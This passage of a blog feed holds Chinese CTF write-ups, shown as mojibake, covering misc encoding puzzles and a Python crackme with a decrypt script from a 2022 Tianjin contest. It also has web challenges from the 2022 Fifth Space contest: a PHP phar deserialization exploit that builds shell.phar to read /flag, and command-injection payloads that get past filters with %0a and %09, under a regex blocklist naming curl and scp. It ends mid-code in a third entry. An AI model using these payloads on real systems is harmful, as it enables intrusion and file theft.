src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164552419.png" alt="image-20220930164552419"></p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164817607.png" alt="image-20220930164817607"></p><p><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930164834081.png" alt="image-20220930164834081"><br>666C61677B4A7573745F65617379217DD<br>TEdDVEYlN0JkR2hwYzE5cGMxOWhYM2R5YjI1blgyWnNZV2NsTWpFJTNEJTdE<br>ä¸¤ä¸ªå­—ç¬¦ä¸²ï¼Œç¬¬ä¸€ä¸ªæ˜¾ç„¶æ˜¯16è¿›åˆ¶ï¼Œç›´æ¥ç™¾åº¦ä¸€ä¸ªè½¬ä¸€ä¸‹<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930165049824.png" alt="image-20220930165049824"><br><code>flag&#123;Just_easy!&#125;</code><br>è¿™ä¸ªå­—ç¬¦ä¸²è§£å‡ºæ¥æ˜¯ä¸ªå‡çš„ æœ‰å…´è¶£çš„åŒå­¦è§£ä¸€ä¸‹</p><h3 id="æœªçŸ¥çš„ç¼–ç "><a href="#æœªçŸ¥çš„ç¼–ç " class="headerlink" title="æœªçŸ¥çš„ç¼–ç "></a>æœªçŸ¥çš„ç¼–ç </h3><p>Â <code>å‚è€ƒä»£ç å¦‚ä¸‹ï¼š&lt;div style=&quot;background-image:url(javascript:eval(String.fromCharCode(%66%6C%61%67%7B%64%34%38%65%31%61%34%64%2D%30%34%63%64%2D%34%62%36%34%2D%38%36%65%39%2D%37%37%66%38%66%35%31%32%39%36%30%35%7D)))&quot;&gt; </code><br>ascllä½ çŸ¥é“æ€ä¹ˆè§£å—ï¼Ÿ<br>ç­¾åˆ°é¢˜ï¼Œurlè§£ä¸€ä¸‹å°±å¯ä»¥äº†<br><img src="/images/2022%E5%B9%B4%E5%A4%A9%E6%B4%A5%E5%B8%82%E5%A4%A7%E5%AD%A6%E7%94%9F%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%BD%91%E7%BB%9C%E6%94%BB%E9%98%B2%E5%A4%A7%E8%B5%9B%E9%83%A8%E5%88%86wp/image-20220930165704813.png" alt="image-20220930165704813"></p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="gdb"><a href="#gdb" class="headerlink" title="gdb"></a>gdb</h3><p>ä¸ä¼šï¼Œç›´æ¥ç™¾åº¦<br>å‚è€ƒ<code>https://www.jianshu.com/p/7779f3e83384</code></p><h3 id="pyé€†å‘"><a href="#pyé€†å‘" class="headerlink" title="pyé€†å‘"></a>pyé€†å‘</h3><p>ä¸æ˜¯æˆ‘åšçš„ï¼Œå®‡å“¥åšçš„ï¼Œæˆ‘ä¸ä¼š<br>å‚è€ƒå®‡å“¥çš„wp<br>é¢˜ç›®ç»™å‡ºæºç   ç›´æ¥ç™¾åº¦å…³é”®ä»£ç </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">key, seed, string</span>):</span></span><br><span class="line">    rst = []</span><br><span class="line">    <span class="keyword">for</span> v <span class="keyword">in</span> string:</span><br><span class="line">        rst.append((<span class="built_in">ord</span>(v) + seed ^ <span class="built_in">ord</span>(key[seed])) % <span class="number">255</span>)</span><br><span class="line">        seed = (seed + <span class="number">1</span>) % <span class="built_in">len</span>(key)</span><br><span class="line">    <span class="keyword">return</span> rst</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    <span class="built_in">print</span> (<span class="string">&quot;Welcome to python crackme&quot;</span>)</span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    KEY1 = <span class="string">&quot;Maybe you are good at decryptint Byte Code, have a try!&quot;</span></span><br><span class="line">    KEY2 = [</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">28</span>,</span><br><span class="line">        <span class="number">120</span>,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        <span class="number">37</span>,</span><br><span class="line">        <span class="number">62</span>,</span><br><span class="line">        <span class="number">67</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">48</span>,</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">14</span>,</span><br><span class="line">        <span class="number">46</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">    ]</span><br><span class="line">    en_out = encrypt(KEY1, <span class="number">5</span>, flag)</span><br><span class="line">    <span class="keyword">if</span> KEY2 == en_out:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;You Win,FLAG IS flag&#123;%s&#125;&quot;</span> % flag)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try Again !&quot;</span>)</span><br></pre></td></tr></table></figure><p>ç›´æ¥æ›¿æ¢key2å°±è¡Œäº†<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt_each</span>(<span class="params">key, seed, KEY2</span>):</span></span><br><span class="line">    answer = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> each <span class="keyword">in</span> KEY2:</span><br><span class="line">        password = each</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>):</span><br><span class="line">            result = (i + seed ^ <span class="built_in">ord</span>(key[seed])) % <span class="number">255</span></span><br><span class="line">            <span class="keyword">if</span> password == result:</span><br><span class="line">                answer += <span class="built_in">chr</span>(i)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        seed = (seed + <span class="number">1</span>) % <span class="built_in">len</span>(key)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> answer</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    KEY1 = <span class="string">&quot;Maybe you are good at decryptint Byte Code, have a try!&quot;</span></span><br><span class="line">    KEY2 = [</span><br><span class="line">        <span class="number">111</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">24</span>,</span><br><span class="line">        <span class="number">28</span>,</span><br><span class="line">        <span class="number">120</span>,</span><br><span class="line">        <span class="number">50</span>,</span><br><span class="line">        <span class="number">37</span>,</span><br><span class="line">        <span class="number">62</span>,</span><br><span class="line">        <span class="number">67</span>,</span><br><span class="line">        <span class="number">52</span>,</span><br><span class="line">        <span class="number">48</span>,</span><br><span class="line">        <span class="number">6</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">122</span>,</span><br><span class="line">        <span class="number">3</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">        <span class="number">72</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">1</span>,</span><br><span class="line">        <span class="number">14</span>,</span><br><span class="line">        <span class="number">46</span>,</span><br><span class="line">        <span class="number">27</span>,</span><br><span class="line">        <span class="number">22</span>,</span><br><span class="line">    ]</span><br><span class="line">    answer = decrypt_each(KEY1, <span class="number">5</span>, KEY2)</span><br><span class="line">    <span class="built_in">print</span>(answer)</span><br><span class="line"><span class="comment">#å¾—åˆ°ï¼š</span></span><br><span class="line"><span class="comment">#JGpaOILOVEPYTHONSOMUCHK</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>æ­¤é¢˜å‚è€ƒ<code>https://l1nwatch.gitbook.io/ctf/idf-shi-yan-shi/reverse-dao-hang-ni-shi/python-bytecode</code></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="unsortheap"><a href="#unsortheap" class="headerlink" title="unsortheap"></a>unsortheap</h3><p>ä¸ä¼š</p><h3 id="myhouse"><a href="#myhouse" class="headerlink" title="myhouse"></a>myhouse</h3><p>ä¸ä¼š</p><blockquote><p>è¿™æ¬¡çš„é¢˜éƒ½èƒ½æœåˆ°ï¼Œä¹Ÿæ²¡å•¥å¥½è¯´çš„ï¼Œå¤ªèœäº†,webä¹Ÿæ²¡å•¥æ„æ€<br>æ„Ÿè°¢æˆ‘çš„å°ä¼™ä¼´ä¸¤å°æ—¶çš„åŠªåŠ›ï¼Œå¾ˆå¼ºäº†<br>å®‡å“¥å¤ªå¼ºäº†<br>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> å¸‚èµ› </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022ç¬¬äº”ç©ºé—´éƒ¨åˆ†wp</title>
      <link href="/2022/09/20/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%83%A8%E5%88%86wp/"/>
      <url>/2022/09/20/2022%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B4%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[<h4 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h4><h3 id="5-ç®€å•çš„Base"><a href="#5-ç®€å•çš„Base" class="headerlink" title="5_ç®€å•çš„Base"></a>5_ç®€å•çš„Base</h3><p>åå…­è¿›åˆ¶è½¬ä¸€ä¸‹å­—ç¬¦ä¸²å³å¯</p><p>666c61677b57656c636f6d655f686572657d</p><p>flag{Welcome_here}</p><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h3 id="5-web-BaliYun"><a href="#5-web-BaliYun" class="headerlink" title="5_web_BaliYun"></a>5_web_BaliYun</h3><p>è€ƒç‚¹ï¼špharååºåˆ—åŒ–</p><p>ç»è¿‡ç›®å½•æ‰«æå‘ç°  <code>www.zip</code></p><blockquote><p>index.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">                    <span class="keyword">include</span>(<span class="string">&quot;class.php&quot;</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>]))&#123;</span><br><span class="line">                        <span class="variable">$down</span> = <span class="keyword">new</span> check_img();</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$down</span>-&gt;img_check();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]))&#123;</span><br><span class="line">                        <span class="variable">$up</span> = <span class="keyword">new</span> upload();</span><br><span class="line">                        <span class="keyword">echo</span> <span class="variable">$up</span>-&gt;start();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>class.php</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$ext</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$size</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$Valid_ext</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;filename = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>];</span><br><span class="line">        <span class="keyword">$this</span>-&gt;ext = end(explode(<span class="string">&quot;.&quot;</span>, <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;name&quot;</span>]));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;size = <span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;size&quot;</span>] / <span class="number">1024</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;Valid_ext = <span class="keyword">array</span>(<span class="string">&quot;gif&quot;</span>, <span class="string">&quot;jpeg&quot;</span>, <span class="string">&quot;jpg&quot;</span>, <span class="string">&quot;png&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;check();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;filename))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image already exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(!in_array(<span class="keyword">$this</span>-&gt;ext, <span class="keyword">$this</span>-&gt;Valid_ext))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Only Image Can Be Uploaded&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;move();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">move</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        move_uploaded_file(<span class="variable">$_FILES</span>[<span class="string">&quot;file&quot;</span>][<span class="string">&quot;tmp_name&quot;</span>], <span class="string">&quot;upload/&quot;</span>.<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Upload succsess!&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">check_img</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$img_name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;img_name = <span class="variable">$_GET</span>[<span class="string">&#x27;img_name&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">img_check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(file_exists(<span class="keyword">$this</span>-&gt;img_name))&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image exsists&quot;</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Image not exsists&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>public function __wakeup(){<br>        echo file_get_contents($this-&gt;filename);<br>    }</p><p>å› ä¸ºè¿™é‡Œå­˜åœ¨wakeupå‡½æ•°ï¼Œä½†æ˜¯åˆä¸å­˜åœ¨ååºåˆ—åŒ–çš„ç‚¹ï¼Œæ‰€ä»¥æˆ‘ä»¬ä½¿ç”¨pharååºåˆ—åŒ–</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æˆ‘ä»¬ä¸€èˆ¬åˆ©ç”¨ååºåˆ—æ¼æ´ï¼Œä¸€èˆ¬éƒ½æ˜¯å€ŸåŠ©unserialize()å‡½æ•°ï¼Œä¸è¿‡éšç€äººä»¬å®‰å…¨çš„æ„è¯†çš„æé«˜è¿™ç§æ¼æ´åˆ©ç”¨è¶Šæ¥è¶Šæ¥éš¾äº†ï¼Œä½†æ˜¯åœ¨2020å¹´8æœˆä»½çš„Blackhat2018å¤§ä¼šä¸Šï¼Œæ¥è‡ªSecarmaçš„å®‰å…¨ç ”ç©¶å‘˜Sam Thomasè®²è¿°äº†ä¸€ç§æ”»å‡»PHPåº”ç”¨çš„æ–°æ–¹å¼ï¼Œåˆ©ç”¨è¿™ç§æ–¹æ³•å¯ä»¥åœ¨ä¸ä½¿ç”¨unserialize()å‡½æ•°çš„æƒ…å†µä¸‹è§¦å‘PHPååºåˆ—åŒ–æ¼æ´ã€‚æ¼æ´è§¦å‘æ˜¯åˆ©ç”¨Phar:// ä¼ªåè®®è¯»å–pharæ–‡ä»¶æ—¶ï¼Œä¼šååºåˆ—åŒ–meta-dataå‚¨å­˜çš„ä¿¡æ¯ã€‚</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">upload</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>=<span class="string">&quot;/flag&quot;</span>; <span class="comment">//è¦è¯»å–çš„æ–‡ä»¶</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> file_get_contents(<span class="keyword">$this</span>-&gt;filename);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> upload();</span><br><span class="line">@unlink(<span class="string">&quot;shell.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span> = <span class="keyword">new</span> Phar(<span class="string">&quot;shell.phar&quot;</span>); <span class="comment">//åç¼€åå¿…é¡»ä¸ºphar</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;startBuffering();</span><br><span class="line"><span class="variable">$phar</span>-&gt;setStub(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//è®¾ç½®stub</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;setMetadata(<span class="variable">$o</span>); <span class="comment">//å°†è‡ªå®šä¹‰çš„meta-dataå­˜å…¥manifest</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;addFromString(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//æ·»åŠ è¦å‹ç¼©çš„æ–‡ä»¶</span></span><br><span class="line"><span class="comment">//ç­¾åè‡ªåŠ¨è®¡ç®—</span></span><br><span class="line"><span class="variable">$phar</span>-&gt;stopBuffering();</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œæ­¤æ–‡ä»¶ï¼Œä¼šç”Ÿæˆä¸€ä¸ªshell.pharæ–‡ä»¶ï¼Œç„¶åæˆ‘ä»¬å°†shell.pharï¼Œæ”¹ä¸ºjpgæ–‡ä»¶ä¸Šä¼ ä¸Šå»ï¼Œ<br>è·¯å¾„ä¸º  upload/shell.jpg</p><p>å€ŸåŠ©<code>phar://</code>æ‰§è¡Œä»£ç <br><code>img_name=phar://upload_file/phar.gif</code></p><h3 id="5-web-letmeguess-1"><a href="#5-web-letmeguess-1" class="headerlink" title="5_web_letmeguess_1"></a>5_web_letmeguess_1</h3><p>è€ƒç‚¹ï¼šå¼±å£ä»¤ï¼Œrceï¼Œè¿‡æ»¤ç›®å½•åˆ†éš”ç¬¦/)ã€ ç©ºæ ¼</p><p>çˆ†ç ´ä¸€ä¸‹  adminï¼Œadmin123<br>è¿‡æ»¤çš„åˆ†éš”ç¬¦<code>linuxä¸­ä¸€äº›å‘½ä»¤åˆ†éš”ç¬¦ï¼š%0a ã€%0d ã€; ã€&amp; ã€| ã€&amp;&amp;ã€||</code><br>è¿‡æ»¤çš„ç©ºæ ¼ï¼Œå¯ä»¥ç”¨<code>%09(tab)ã€%09ã€ $&#123;IFS&#125;ã€$IFSã€$IFS$1ã€$&#123;IFS&#125;$ã€&lt;ã€&lt;&gt;è¿™äº›éƒ½å¯ä»¥å½“åšç©ºæ ¼ç¬¦ä½œä¸ºä»£æ›¿ã€‚</code><br>è¿‡æ»¤äº†catï¼Œå¯ä»¥ç”¨ <code>nlï¼Œnlï¼šæ˜¾ç¤ºçš„æ—¶å€™ï¼Œé¡ºä¾¿è¾“å‡ºè¡Œå·</code><br><code>ip=%0anl%09index.php</code><br>å¯ä»¥è¯»å–æºç ï¼Œå¤ªé•¿ï¼Œè´´ä¸€ä¸‹å…³é”®</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if (!preg_match_all(&quot;/(\||&amp;|;| |\/|cat|flag|touch|more|curl|scp|kylin|echo|tmp|var|run|find|grep|-|`|&#x27;|:|&lt;|&gt;|less|more)/&quot;, $ip, $m)) </span><br></pre></td></tr></table></figure><p><code>ip=%0als</code>  lsçš„æ—¶å€™æœ‰ä¸€ä¸ªkylinç›®å½•ï¼Œç›®å½•ä¸‹æœ‰ä¸€ä¸ªflag.txt ï¼Œä½†æ˜¯ä¸èƒ½è®¿é—®<br>ä¸”kylinï¼Œflagéƒ½è¢«è¿‡æ»¤äº†ï¼Œæˆ‘ä»¬ç”¨é—®å·æ›¿æ¢å…¶ä¸­ä¸€ä¸ªå­—ç¬¦å³å¯<br>ç»•è¿‡ç›®å½•åˆ†éš”ç¬¦çš„è¯ï¼Œå…ˆcd åˆ°è¿™ä¸ªç›®å½•ï¼Œå†å»catå³å¯</p><p><code>/?ip=%0acd%09ky?in%0anl%09f?ag.txt</code><br>è§£æ³•ä¸å”¯ä¸€</p><blockquote><p>å‚è€ƒ pharååºåˆ—åŒ–<br><a href="https://www.cnblogs.com/zzjdbk/p/13030571.html">https://www.cnblogs.com/zzjdbk/p/13030571.html</a></p></blockquote><h4 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h4><blockquote><p>ä¸€ç›´åœ¨è·¯ä¸Š</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> web </tag>
            
            <tag> ç¬¬äº”ç©ºé—´ </tag>
            
            <tag> pharååºåˆ—åŒ–ï¼Œrce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>cqgamectf-1</title>
      <link href="/2022/05/07/cqgamectf-1/"/>
      <url>/2022/05/07/cqgamectf-1/</url>
      
        <content type="html"><![CDATA[<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]) &#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (<span class="string">&#x27;;&#x27;</span> === preg_replace(<span class="string">&#x27;/[a-z_]+\((?R)?\)/&#x27;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$cmd</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span 